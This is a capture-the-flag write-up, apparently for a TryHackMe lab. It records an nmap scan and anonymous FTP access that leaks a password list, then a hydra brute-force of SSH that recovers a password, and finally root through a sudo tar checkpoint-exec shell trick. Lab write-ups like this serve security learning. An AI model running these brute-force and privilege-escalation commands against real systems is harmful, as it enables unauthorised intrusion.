### nmap
```
─(root💀kali)-[~/Desktop/THM]
└─# nmap -sT -sV -A 10.10.38.189
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-05 13:31 IST
Nmap scan report for 10.10.38.189
Host is up (0.15s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
<mark style="background: #ADCCFFA6;">21/tcp open  ftp     vsftpd 3.0.3</mark>
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.20.174
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
<mark style="background: #ADCCFFA6;">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu</mark> 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
<mark style="background: #ADCCFFA6;">80/tcp open  http    Apache httpd 2.4.18 </mark>((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (89%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (89%), Linux 3.7 (89%), Linux 5.0 (89%), Linux 5.0 - 5.4 (89%), Linux 5.1 (89%), Ubiquiti AirOS 5.5.9 (89%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   149.16 ms 10.18.0.1
2   149.25 ms 10.10.38.189

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.64 seconds
```

### FTP

Anonymous login allowe

┌──(root💀kali)-[~/Desktop/THM]
└─# cat task.txt   
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin




──(root💀kali)-[~/Desktop/THM]
└─# cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e

### Shell

used the data found in ftp to brute force ssh since it was open

┌──(root💀kali)-[~/Desktop/THM]
└─# hydra -l lin -P locks.txt 10.10.38.189 ssh                                                                                                         

found a hit

[22][ssh] host: 10.10.38.189   login: lin   password: RedDr4gonSynd1cat3

### Priv ESC

──(root💀kali)-[~/Desktop/THM]
└─# ssh lin@10.10.38.189   


able to login into system as lin


lin@bountyhacker:~/Desktop$ sudo -l

User lin may run the following commands on bountyhacker:
    (root) /bin/tar



lin@bountyhacker:~/Desktop$ find / -type f -perm -u=s 2>/dev/null


>Here we are able to run tar as sudo so i went to gtfo bins to see how to escalate privileges with this



got this command from there and i got the root

lin@bountyhacker:/tmp$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

whoami
root


>and i got the root flag in /root
